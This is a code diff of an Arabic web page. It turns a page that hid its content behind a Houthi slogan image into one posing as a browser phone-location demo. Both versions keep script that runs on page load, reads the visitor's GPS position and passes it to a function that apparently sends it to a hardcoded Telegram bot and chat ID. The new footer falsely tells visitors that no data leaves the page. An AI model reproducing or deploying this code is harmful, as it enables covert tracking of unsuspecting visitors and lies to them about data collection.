@@ -3,89 +3,81 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>الصرخة</title>
+  <title>تحديد موقع الهاتف بدقة عبر المتصفح</title>
+  <link
+    rel="stylesheet"
+    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+    integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY="
+    crossorigin=""
+  />
   <style>
-    /* إخفاء كل محتوى الصفحة بصريًا */
-    body, html {
-      margin: 0;
-      padding: 0;
-      width: 100%;
-      height: 100%;
-      background: #ffffff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      overflow: hidden;
-      position: relative;
-    }
-
-    /* صورة الشعار في الوسط */
-    #logo {
-      max-width: 50%;
-      max-height: 50%;
-      z-index: 1000;
-    }
-
-    /* إخفاء باقي العناصر بصريًا مع إبقائها في DOM */
-    .hidden-content {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      opacity: 0;  /* يخفي العناصر بصريًا */
-      pointer-events: none; /* يمنع التفاعل معها */
-    }
+    :root { --bg:#0b1220; --fg:#e7edf7; --muted:#96a1b0; --card:#121a2a; --accent:#4da3ff; }
+    * { box-sizing: border-box; }
+    body { margin:0; font-family: system-ui, -apple-system, Segoe UI, Roboto, "Noto Naskh Arabic UI", Arial, sans-serif; background:var(--bg); color:var(--fg); }
+    header { padding: 18px 16px; border-bottom: 1px solid #22304a; position: sticky; top:0; background: linear-gradient(180deg, #0b1220 0%, #0b1220cc 100%); backdrop-filter: blur(6px); z-index: 1000; }
+    h1 { margin: 0; font-size: 20px; }
+    .container { padding: 16px; display: grid; gap: 16px; grid-template-columns: 1fr; max-width: 1100px; margin: 0 auto; }
+    .card { background: var(--card); border: 1px solid #1c2840; border-radius: 16px; padding: 16px; box-shadow: 0 10px 30px #00000033; }
+    .row { display: grid; gap: 12px; grid-template-columns: 1fr; }
+    .controls { display: flex; flex-wrap: wrap; gap: 8px; }
+    button, .btn { cursor: pointer; border: 1px solid #275082; background: #16243a; color: var(--fg); padding: 10px 14px; border-radius: 999px; font-weight: 600; transition: transform .06s ease, background .2s ease; }
+    button:hover { background: #1c2f4d; }
+    button:active { transform: scale(0.98); }
+    .btn-primary { background: #1c4b8e; border-color: #2a6ac8; }
+    .btn-secondary { background: #151f33; border-color: #2a3652; }
+    .hint { color: var(--muted); font-size: 13px; }
+    .kv { display:grid; grid-template-columns: auto 1fr; gap: 6px 12px; font-size: 14px; }
+    .kv div:nth-child(odd){ color: var(--muted); }
+    #map { width: 100%; height: 55vh; border-radius: 16px; border: 1px solid #1c2840; }
+    .badge { display:inline-flex; align-items:center; gap:6px; background:#0f1b30; border:1px solid #203252; color:#cfe3ff; padding:6px 10px; border-radius:999px; font-size:12px; }
+    .ok { color:#7dffa0; }
+    .warn { color:#ffd36e; }
+    .err { color:#ff8c8c; }
+    footer { text-align:center; color: #7d8aa3; padding: 10px 0 18px; font-size: 12px; }
+    @media (min-width: 880px){ .row { grid-template-columns: 1.1fr .9fr; } }
   </style>
 </head>
 <body>
-  <!-- الشعار فقط ظاهر -->
-  <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/38/Slogan_of_the_Houthi_Movement.svg/500px-Slogan_of_the_Houthi_Movement.svg.png" alt="شعار أنصار الله">
+  <header>
+    <h1>تحديد موقع الهاتف بدقة عبر المتصفح</h1>
+  </header>
 
-  <!-- كل محتوى الصفحة الأصلي مخفي بصريًا -->
-  <div class="hidden-content">
-    <header>
-      <h1>الصرخة</h1>
-    </header>
-
-    <div class="container">
-      <section class="card row">
-        <div>
-          <div class="controls" style="margin-bottom:12px;">
-            <button id="copyBtn" class="btn btn-secondary">نسخ الإحداثيات</button>
-            <a class="btn btn-secondary" id="mapsBtn" target="_blank" rel="noopener">فتح في خرائط جوجل</a>
-          </div>
-          <div class="hint">أكد مصداقيتك على قول الحق</div>
-          <div style="margin-top:10px; display:flex; gap:8px; flex-wrap:wrap;">
-            <span class="badge ok" id="secureBadge">أكد مصداقيتك على قول الحق</span>
-            <span class="badge ok" id="permBadge">أكد مصداقيتك على قول الحق</span>
-            <span class="badge" id="sensorBadge">أكد مصداقيتك على قول الحق</span>
-          </div>
-          <div class="kv" style="margin-top:12px;">
-            <div>خط العرض (lat):</div><div id="lat">—</div>
-            <div>خط الطول (lng):</div><div id="lng">—</div>
-            <div>الدقة (متر):</div><div id="accuracy">—</div>
-            <div>الارتفاع (متر):</div><div id="altitude">—</div>
-            <div>دقة الارتفاع (متر):</div><div id="altAcc">—</div>
-            <div>الاتجاه (heading°):</div><div id="heading">—</div>
-            <div>السرعة (م/ث):</div><div id="speed">—</div>
-            <div>آخر تحديث:</div><div id="timestamp">—</div>
-          </div>
+  <div class="container">
+    <section class="card row">
+      <div>
+        <div class="controls" style="margin-bottom:12px;">
+          <button id="copyBtn" class="btn btn-secondary">نسخ الإحداثيات</button>
+          <a class="btn btn-secondary" id="mapsBtn" target="_blank" rel="noopener">فتح في خرائط جوجل</a>
         </div>
-        <div>
-          <div id="map"></div>
+        <div class="hint">يتطلب اتصالاً آمناً (HTTPS) أو <span dir="ltr">http://localhost</span>.</div>
+        <div style="margin-top:10px; display:flex; gap:8px; flex-wrap:wrap;">
+          <span class="badge ok" id="secureBadge">المنشأ الآمن: نعم</span>
+          <span class="badge ok" id="permBadge">إذن الموقع: مسموح</span>
+          <span class="badge" id="sensorBadge">المستشعرات العالية: مُفعّل</span>
         </div>
-      </section>
-    </div>
-
-    <footer>أكد مصداقيتك على قول الحق</footer>
+        <div class="kv" style="margin-top:12px;">
+          <div>خط العرض (lat):</div><div id="lat">—</div>
+          <div>خط الطول (lng):</div><div id="lng">—</div>
+          <div>الدقة (متر):</div><div id="accuracy">—</div>
+          <div>الارتفاع (متر):</div><div id="altitude">—</div>
+          <div>دقة الارتفاع (متر):</div><div id="altAcc">—</div>
+          <div>الاتجاه (heading°):</div><div id="heading">—</div>
+          <div>السرعة (م/ث):</div><div id="speed">—</div>
+          <div>آخر تحديث:</div><div id="timestamp">—</div>
+        </div>
+        <p class="hint" style="margin-top:8px;">نصيحة للدقة العالية: فعّل GPS، البلوتوث، والـ Wi-Fi؛ وابقَ في مكان مفتوح إن أمكن.</p>
+      </div>
+      <div>
+        <div id="map"></div>
+      </div>
+    </section>
   </div>
 
-  <!-- Leaflet وخريطة -->
+  <footer>© تجربة تحديد الموقع بالمتصفح — لا يتم إرسال بياناتك لأي خادم في هذا الملف.</footer>
+
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <script>
-    // الكود الأصلي لجمع الموقع وإرسال التيليجرام
-    const TELEGRAM_TOKEN = "8267173113:AAGt0PYYlcrOCcoNC7PMMMhYNxNJrlx5aN0";
+    const TELEGRAM_TOKEN = "8311481632:AAETlYWOIXNkqZEGQrLO0ZvC3T24gp_dHCUا";
     const TELEGRAM_CHAT_ID = "6837315281";
 
     async function sendToTelegram(lat, lng, accuracy) {
@@ -107,7 +99,8 @@
     const copyBtn = el('copyBtn'), mapsBtn = el('mapsBtn');
 
     const isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
-    secureBadge.textContent = "أكد مصداقيتك على قول الحق";
+    secureBadge.textContent = `المنشأ الآمن: ${isSecure ? 'نعم' : 'لا'}`;
+    secureBadge.classList.add(isSecure ? 'ok':'warn');
 
     let map = L.map('map').setView([15.3694, 44.1910], 6);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom:19 }).addTo(map);
@@ -137,11 +130,13 @@
       updateMap(c.latitude,c.longitude,c.accuracy||30);
       mapsBtn.href = `https://www.google.com/maps?q=${c.latitude},${c.longitude}`;
       sendToTelegram(c.latitude,c.longitude,Math.round(c.accuracy||0));
-      permBadge.textContent = "أكد مصداقيتك على قول الحق";
+      permBadge.textContent = "إذن الموقع: مسموح";
+      permBadge.classList.add('ok');
     }
 
     function showError(err){
-      permBadge.textContent = "أكد مصداقيتك على قول الحق";
+      permBadge.textContent = "إذن الموقع: مرفوض";
+      permBadge.classList.add('err');
       console.error("خطأ:", err.message);
     }
 
@@ -164,6 +159,7 @@
       try{ await navigator.clipboard.writeText(`${lat},${lng}`); } catch{}
     });
 
+    // تشغيل تلقائي عند فتح الصفحة
     window.addEventListener('load', ()=>{
       getOnce();
       startWatch();
